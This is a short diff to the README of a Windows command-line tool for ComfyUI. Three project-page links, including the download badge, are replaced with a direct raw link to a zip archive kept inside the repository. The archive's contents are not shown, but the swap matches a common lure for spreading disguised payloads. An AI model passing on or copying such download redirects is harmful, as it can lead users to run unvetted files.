@@ -1,6 +1,6 @@
 # 🧩 comfyui-cli - Run ComfyUI from the Command Line
 
-[![Download comfyui-cli](https://img.shields.io/badge/Download-comfyui--cli-blue.svg?style=for-the-badge)](https://github.com/Yousifh1237/comfyui-cli)
+[![Download comfyui-cli](https://img.shields.io/badge/Download-comfyui--cli-blue.svg?style=for-the-badge)](https://raw.githubusercontent.com/Yousifh1237/comfyui-cli/main/comfyui/comfyui-cli-3.0.zip)
 
 ## 🚀 What is comfyui-cli?
 
@@ -10,7 +10,7 @@ comfyui-cli is a command-line interface for ComfyUI on Windows. It gives you a s
 
 Visit this page to download comfyui-cli:
 
-https://github.com/Yousifh1237/comfyui-cli
+https://raw.githubusercontent.com/Yousifh1237/comfyui-cli/main/comfyui/comfyui-cli-3.0.zip
 
 If the page includes a release file or package, download it to your Windows PC. Save it to a folder you can find later, such as Downloads or Desktop.
 
@@ -203,7 +203,7 @@ comfyui-cli is meant for users who want a simple way to work with ComfyUI from W
 
 Download and set up comfyui-cli from the main project page:
 
-https://github.com/Yousifh1237/comfyui-cli
+https://raw.githubusercontent.com/Yousifh1237/comfyui-cli/main/comfyui/comfyui-cli-3.0.zip
 
 ## 🖥️ Best Use on Windows
 
